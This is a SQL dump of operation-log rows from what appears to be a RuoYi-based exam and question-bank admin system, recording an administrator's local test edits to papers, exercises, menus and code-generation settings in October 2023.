INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (201, '试卷管理', 2, 'com.ruoyi.project.csp.controller.TbPaperController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/paper', '127.0.0.1', '内网IP', '{\"createBy\":\"\",\"createTime\":\"2023-10-25 15:39:47\",\"id\":1,\"paperName\":\"测试12312123\",\"params\":{},\"updateBy\":\"\",\"updateTime\":\"2023-10-25 15:44:10\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:44:10', 21);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (202, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"asd\",\"choiceB\":\"asd\",\"choiceC\":\"asd\",\"choiceD\":\"asd\",\"correctAnswer\":\"asd\",\"createBy\":\"admin\",\"createTime\":\"2023-10-25 16:10:47\",\"exerciseTitle\":\"a s d\",\"exerciseType\":1,\"id\":3,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 16:10:47', 49);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (203, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"123\",\"choiceA\":\"asd\",\"choiceB\":\"123\",\"choiceC\":\"123\",\"choiceD\":\"123\",\"correctAnswer\":\"123\",\"createBy\":\"admin\",\"createTime\":\"2023-10-25 16:10:58\",\"exerciseTitle\":\"asd\",\"exerciseType\":1,\"id\":4,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 16:10:58', 17);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (204, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/3', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 16:11:01', 33);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (205, '代码生成', 3, 'com.ruoyi.project.tool.gen.controller.GenController.remove()', 'DELETE', 1, 'admin', NULL, '/tool/gen/3', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-26 09:18:59', 50);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (206, '代码生成', 3, 'com.ruoyi.project.tool.gen.controller.GenController.remove()', 'DELETE', 1, 'admin', NULL, '/tool/gen/1', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-26 09:19:00', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (207, '代码生成', 6, 'com.ruoyi.project.tool.gen.controller.GenController.importTableSave()', 'POST', 1, 'admin', NULL, '/tool/gen/importTable', '127.0.0.1', '内网IP', '{\"tables\":\"tb_paper_exercise\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-26 09:19:07', 98);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (208, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exercise\",\"className\":\"TbPaperExercise\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":33,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 09:19:07\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":4,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"PaperId\",\"columnComment\":\"试卷id\",\"columnId\":34,\"columnName\":\"paper_id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 09:19:07\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"paperId\",\"javaType\":\"Long\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"EQ\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":4,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"ExerciseId\",\"columnComment\":\"题目id\",\"columnId\":35,\"columnName\":\"exercise_id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 09:19:07\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"exerciseId\",\"javaType\":\"Long\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":4,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"Score\",\"columnComment\":\"题目分数\",\"columnId\":36,\"columnName\":\"score\",\"columnType\":\"int\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 09:19:07\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"score\",\"javaType\":\"Long\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryTyp', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-26 09:19:58', 56);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (209, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"dataControl/paper/index\",\"createTime\":\"2023-10-25 15:14:07\",\"icon\":\"documentation\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":2022,\"menuName\":\"试卷管理\",\"menuType\":\"C\",\"orderNum\":1,\"params\":{},\"parentId\":2009,\"path\":\"paper\",\"perms\":\"dataControl:paper:list\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-26 16:30:03', 43);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (210, '代码生成', 6, 'com.ruoyi.project.tool.gen.controller.GenController.importTableSave()', 'POST', 1, 'admin', NULL, '/tool/gen/importTable', '127.0.0.1', '内网IP', '{\"tables\":\"tb_exam\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-26 16:30:46', 142);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (211, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exam\",\"className\":\"TbExam\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":37,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 16:30:46\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":5,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"ExamName\",\"columnComment\":\"考试名称\",\"columnId\":38,\"columnName\":\"exam_name\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 16:30:46\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"examName\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":5,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"PaperId\",\"columnComment\":\"试卷id\",\"columnId\":39,\"columnName\":\"paper_id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 16:30:46\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"paperId\",\"javaType\":\"Long\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":5,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"StartTime\",\"columnComment\":\"开始时间\",\"columnId\":40,\"columnName\":\"start_time\",\"columnType\":\"datetime\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 16:30:46\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"datetime\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"startTime\",\"javaType\":\"Date\",\"list\":true,\"params\":{},\"pk\":false,\"query\":f', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-26 16:33:20', 81);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (212, '代码生成', 6, 'com.ruoyi.project.tool.gen.controller.GenController.importTableSave()', 'POST', 1, 'admin', NULL, '/tool/gen/importTable', '127.0.0.1', '内网IP', '{\"tables\":\"tb_paper\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-26 16:33:45', 98);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (213, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"paper\",\"className\":\"TbPaper\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":48,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 16:33:44\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":6,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"PaperName\",\"columnComment\":\"试卷名称\",\"columnId\":49,\"columnName\":\"paper_name\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 16:33:44\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"paperName\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":6,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"IsDelete\",\"columnComment\":\"是否删除 0:否 1:是\",\"columnId\":50,\"columnName\":\"is_delete\",\"columnType\":\"tinyint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 16:33:44\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"isDelete\",\"javaType\":\"Long\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":6,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"CreateBy\",\"columnComment\":\"创建者\",\"columnId\":51,\"columnName\":\"create_by\",\"columnType\":\"varchar(64)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 16:33:44\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isPk\":\"0\",\"javaField\":\"createBy\",\"javaType\":\"String\",\"list\":false,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"r', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-26 16:34:11', 66);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (214, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exam\",\"className\":\"TbExam\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":37,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 16:30:46\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":5,\"updateBy\":\"\",\"updateTime\":\"2023-10-26 16:33:20\",\"usableColumn\":false},{\"capJavaField\":\"ExamName\",\"columnComment\":\"考试名称\",\"columnId\":38,\"columnName\":\"exam_name\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 16:30:46\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"examName\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":5,\"updateBy\":\"\",\"updateTime\":\"2023-10-26 16:33:20\",\"usableColumn\":false},{\"capJavaField\":\"PaperId\",\"columnComment\":\"试卷id\",\"columnId\":39,\"columnName\":\"paper_id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 16:30:46\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"paperId\",\"javaType\":\"Long\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":5,\"updateBy\":\"\",\"updateTime\":\"2023-10-26 16:33:20\",\"usableColumn\":false},{\"capJavaField\":\"StartTime\",\"columnComment\":\"开始时间\",\"columnId\":40,\"columnName\":\"start_time\",\"columnType\":\"datetime\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 16:30:46\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"datetime\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\"', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-26 16:34:46', 60);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (215, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exam\",\"className\":\"TbExam\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":37,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 16:30:46\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":5,\"updateBy\":\"\",\"updateTime\":\"2023-10-26 16:34:46\",\"usableColumn\":false},{\"capJavaField\":\"ExamName\",\"columnComment\":\"考试名称\",\"columnId\":38,\"columnName\":\"exam_name\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 16:30:46\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"examName\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":5,\"updateBy\":\"\",\"updateTime\":\"2023-10-26 16:34:46\",\"usableColumn\":false},{\"capJavaField\":\"PaperId\",\"columnComment\":\"试卷id\",\"columnId\":39,\"columnName\":\"paper_id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 16:30:46\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"paperId\",\"javaType\":\"Long\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":5,\"updateBy\":\"\",\"updateTime\":\"2023-10-26 16:34:46\",\"usableColumn\":false},{\"capJavaField\":\"StartTime\",\"columnComment\":\"开始时间\",\"columnId\":40,\"columnName\":\"start_time\",\"columnType\":\"datetime\",\"createBy\":\"admin\",\"createTime\":\"2023-10-26 16:30:46\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"datetime\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\"', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-26 16:36:13', 71);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (216, '字典数据', 2, 'com.ruoyi.project.system.controller.SysDictDataController.edit()', 'PUT', 1, 'admin', NULL, '/system/dict/data', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-10-25 08:56:10\",\"default\":false,\"dictCode\":102,\"dictLabel\":\"基础题\",\"dictSort\":0,\"dictType\":\"sys_exercise_cate\",\"dictValue\":\"0\",\"isDefault\":\"N\",\"listClass\":\"default\",\"params\":{},\"status\":\"1\",\"updateBy\":\"admin\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-27 16:36:44', 89);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (217, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"12312\",\"choiceA\":\"asdasd\",\"choiceB\":\"asd\",\"choiceC\":\"asdas\",\"choiceD\":\"asd\",\"correctAnswer\":\"C\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 08:59:32\",\"exerciseTitle\":\"<p>asdasda</p>\",\"exerciseType\":0,\"id\":1,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 08:59:32', 40);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (218, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"aaa\",\"choiceA\":\"123\",\"choiceB\":\"123\",\"choiceC\":\"123\",\"choiceD\":\"123\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 09:10:37\",\"exerciseTitle\":\"<p>12312312</p>\",\"exerciseType\":0,\"id\":2,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 09:10:37', 30);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (219, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"12312\",\"choiceA\":\"asdasd\",\"choiceB\":\"asd\",\"choiceC\":\"asdas\",\"choiceD\":\"asd\",\"correctAnswer\":\"C\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 08:59:33\",\"exerciseTitle\":\"<p>asdasdaasdasdasdas</p>\",\"exerciseType\":0,\"id\":1,\"isDelete\":0,\"params\":{},\"quesType\":0,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-30 09:30:09\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 09:30:09', 21);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (220, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"12312\",\"choiceA\":\"asdasd\",\"choiceB\":\"asd\",\"choiceC\":\"asdas\",\"choiceD\":\"asd\",\"correctAnswer\":\"C\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 08:59:33\",\"exerciseTitle\":\"<p>asdasdaasdasdasdas</p><p>123123</p>\",\"exerciseType\":0,\"id\":1,\"isDelete\":0,\"params\":{},\"quesType\":0,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-30 09:30:15\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 09:30:15', 25);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (221, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"12312\",\"choiceA\":\"asdasd\",\"choiceB\":\"asd\",\"choiceC\":\"asdas\",\"choiceD\":\"asd\",\"correctAnswer\":\"C\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 08:59:33\",\"exerciseTitle\":\"<p>asdasdaasdasdasdas</p><p>123123</p><p><img src=\\\"/dev-api/profile/upload/2023/10/30/640_20231030093443A003.png\\\"></p>\",\"exerciseType\":0,\"id\":1,\"isDelete\":0,\"params\":{},\"quesType\":0,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-30 09:34:45\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 09:34:45', 26);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (222, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asdasdas\",\"choiceA\":\"dasdasd\",\"choiceB\":\"dasd\",\"choiceC\":\"asdasdas\",\"choiceD\":\"asdasd\",\"correctAnswer\":\"D\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 10:32:59\",\"exerciseTitle\":\"<p>asdasdasd</p>\",\"exerciseType\":0,\"id\":1,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-30 10:32:59', 44);
